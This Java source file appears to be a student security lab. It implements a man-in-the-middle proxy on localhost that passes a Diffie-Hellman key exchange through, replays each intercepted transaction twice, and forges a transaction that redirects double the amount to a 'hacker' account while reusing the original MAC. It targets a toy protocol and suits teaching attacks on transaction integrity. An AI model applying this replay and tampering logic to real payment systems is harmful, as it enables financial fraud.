import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.net.ServerSocket;
import java.net.Socket;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;

import utils.CryptoTools;
import utils.DiffieHellman;
import utils.TransactionMessage;

public class ManInTheMiddle {

	private ServerSocket serverSocket;

	// Constructor del Servidor
	public ManInTheMiddle() throws Exception {
		// ServerSocketFactory para construir los ServerSockets
		ServerSocketFactory socketFactory = (ServerSocketFactory) ServerSocketFactory.getDefault();
		// Creación de un objeto ServerSocket escuchando peticiones en el puerto 7070
		serverSocket = (ServerSocket) socketFactory.createServerSocket(6666);
	}

	private void sendTransactionSeparateSocket(TransactionMessage transaction) {

		SocketFactory socketFactoryClient = (SocketFactory) SocketFactory.getDefault();
		try {
			Socket socketClient = (Socket) socketFactoryClient.createSocket("localhost", 3343);

			// Crea un PrintWriter para enviar mensaje/MAC al servidor
			PrintWriter outputToServer = new PrintWriter(new OutputStreamWriter(socketClient.getOutputStream()));
			// Crea un objeto BufferedReader para leer la respuesta del servidor
			BufferedReader inputFromServer = new BufferedReader(new InputStreamReader(socketClient.getInputStream()));

			// Replay attack

			TransactionMessage.send(transaction, outputToServer);
			String serverResponse = inputFromServer.readLine();

			System.out.println("(Replay attack) Server Response: " + serverResponse);

			outputToServer.close();
			inputFromServer.close();
			socketClient.close();

		} catch (IOException e) {
			e.printStackTrace();
		}

	}

	private void replyAttack(TransactionMessage transaction) {
		System.out.println("(Replay attack) enviando transaccion");
		sendTransactionSeparateSocket(transaction);
		System.out.println("(Replay attack) reenviando transaccion");
		sendTransactionSeparateSocket(transaction);
	}

	// Ejecución del servidor para escuchar peticiones de los clientes
	private void runServer() {
		while (true) {
			// Espera las peticiones del cliente para comprobar mensaje/MAC
			try {
				System.err.println("Esperando conexiones de victimas...");
				Socket socketWithClient = (Socket) serverSocket.accept();
				SocketFactory socketFactoryAsClient = (SocketFactory) SocketFactory.getDefault();
				Socket socketWithServer = (Socket) socketFactoryAsClient.createSocket("localhost", 3343);
				// A partir de ahora, solo se llega aqui cuando se abre una conexion
				System.out.println("Una victima se ha conectado!");

				// Abre un BufferedReader para leer los datos del cliente
				BufferedReader inputFromClient = new BufferedReader(new InputStreamReader(socketWithClient.getInputStream()));
				// Abre un PrintWriter para enviar datos al cliente
				PrintWriter outputToClient = new PrintWriter(new OutputStreamWriter(socketWithClient.getOutputStream()));
				// Se lee del cliente el mensaje y el macdelMensajeEnviado

				// Crea un PrintWriter para enviar mensaje/MAC al servidor
				PrintWriter outputToServer = new PrintWriter(new OutputStreamWriter(socketWithServer.getOutputStream()));
				// String userName = JOptionPane.showInputDialog(null, "Introduzca su
				// mensaje:");

				// Crea un objeto BufferedReader para leer la respuesta del servidor
				BufferedReader inputFromServer = new BufferedReader(new InputStreamReader(socketWithServer.getInputStream()));

				// INTERCAMBIO DE CLAVES
				DiffieHellman.keyExchangePasstrough(inputFromClient, inputFromServer, outputToClient, outputToServer);

				// String mensaje = input.readLine();
				// A continuación habría que calcular el mac del MensajeEnviado que podría ser
				// String macdelMensajeEnviado = input.readLine();
				Boolean aliveSession = true;
				while (aliveSession) {
					TransactionMessage transaction = TransactionMessage.receive(inputFromClient);
					System.out.println( "--- ["+transaction.getNonce()+"] transaccion capturada");
					
					

					// Reply attack
					
					TransactionMessage.send(transaction, outputToServer);
					outputToServer.println();
					outputToServer.flush();
					System.out.println("--- ["+transaction.getNonce()+"] transaccion enviada");
					System.out.println("--- ["+transaction.getNonce()+"] respuesta del servidor" + inputFromServer.readLine());
					
					TransactionMessage.send(transaction, outputToServer);
					outputToServer.println();
					outputToServer.flush();
					System.out.println("--- ["+transaction.getNonce()+"] transaccion replicada");
					System.out.println("--- ["+transaction.getNonce()+"] respuesta del servidor" + inputFromServer.readLine());					

					// MiTM Attack
					TransactionMessage transactionCorrupt = new TransactionMessage(transaction.getSourceAccount(),
							"hacker", transaction.getAmount().doubleValue()*2, CryptoTools.generateNonce(), transaction.getMac());

					TransactionMessage.send(transactionCorrupt, outputToServer);
					// If this is the final transaction, Forward the end of session from Client to Server
					//outputToServer.println();
					//outputToServer.flush();
					System.out.println("--- ["+transactionCorrupt.getNonce()+"] transaccion corrompida");
					System.out.println("--- ["+transactionCorrupt.getNonce()+"] respuesta del servidor" + inputFromServer.readLine());
					
					outputToClient.println("Servidor MiTM: Usted fue hackeado >:)");
					outputToClient.flush();

					// The session will continue if an empty line is received from client
					String aliveSessionResponse = inputFromClient.readLine();
					aliveSession = aliveSessionResponse.isEmpty();
					
					//Forward the end of session from Client to Server
					outputToServer.println(aliveSessionResponse);
					outputToServer.flush();
				}

				
				System.out.println("--- Sesión de víctima finalizada");

				outputToServer.close();
				inputFromServer.close();
				socketWithServer.close();
				outputToClient.close();
				inputFromClient.close();
				socketWithClient.close();

			} catch (IOException ioException) {
				ioException.printStackTrace();
			}
			System.out.println("...");
		}
	}

	public static void main(String args[]) throws Exception {
		ManInTheMiddle server = new ManInTheMiddle();
		server.runServer();
	}

}
